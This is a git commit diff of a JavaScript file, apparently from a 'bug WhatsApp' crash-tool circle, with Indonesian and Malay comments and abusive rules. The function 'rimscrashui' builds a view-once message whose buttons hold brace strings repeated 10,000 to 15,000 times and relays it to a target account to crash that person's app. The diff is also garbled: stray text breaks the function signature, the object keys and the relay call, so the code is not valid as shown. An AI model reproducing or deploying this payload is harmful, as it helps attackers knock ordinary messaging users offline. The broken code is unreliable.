50567bf477051f0d6a5c95c299aaea1dd3af7968
taufiq461 <topektopek4674@gmail.com>
2025-10-05 15:52:10 +0800

    Update BlankUiRims.js
    apk sc

--- BlankUiRims.js
+++ BlankUiRims.js
@@ -6,7 +6,7 @@ Rules :
 Melanggar? Gw Bl + Kick Lu Bangsat 
 */
 
-async function rimscrashui(target sama ios android pc tv) {
+async function rimscrashui(target sama ios android pc tv) { android pc telefon 
 let message = {
 viewOnceMessage: {
 message: {
@@ -33,14 +33,14 @@ buttons: [
 { name: "send_location", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "quick_reply", ParamsJson: "{".repeat(15000), version: 5 },
 { name: "mpm", ParamsJson: "{".repeat(10000), version: 5 }, 
-],name: "npm start run bot prem jasa bug version 5 update 2028
-},nama  "npm install run bot panel atau termux java sc bug wasap atau telegram
+],name: "npm start run bot prem jasa bug version 5 update 2028 repeat 1500
+},nama  "npm install run bot panel atau termux java sc bug wasap atau telegram version 6
  
 },
 },
 },
 };
-await rims.relayMessage(target, message, { participant: { jid: target }, } ); } saya pakai saya pakai wasap rasmi rasmi wasap kedai dan saya teah pakai wasap rasmi ori target ip 7; android 5675
+await rims.relayMessage(target, message, { participantpanek panel sc bug wasap: { jid: target }, } ); } saya pakai saya pakai wasap rasmi rasmi wasap kedai dan saya teah pakai wasap rasmi ori target ip 7; android 5675
 
 /*
  JIKA MELIHAT ORNG/PT SAYA YG MENYEBABKAN FUNCTION INI MOHON LAPORKAN SAYA ( @GyzenVtx ), Lu Bakal Gw Kasih 1 Function Privat Gw Jika Melaporkan Jika Patner Gw Ada Yg Nyebar Function Ini 
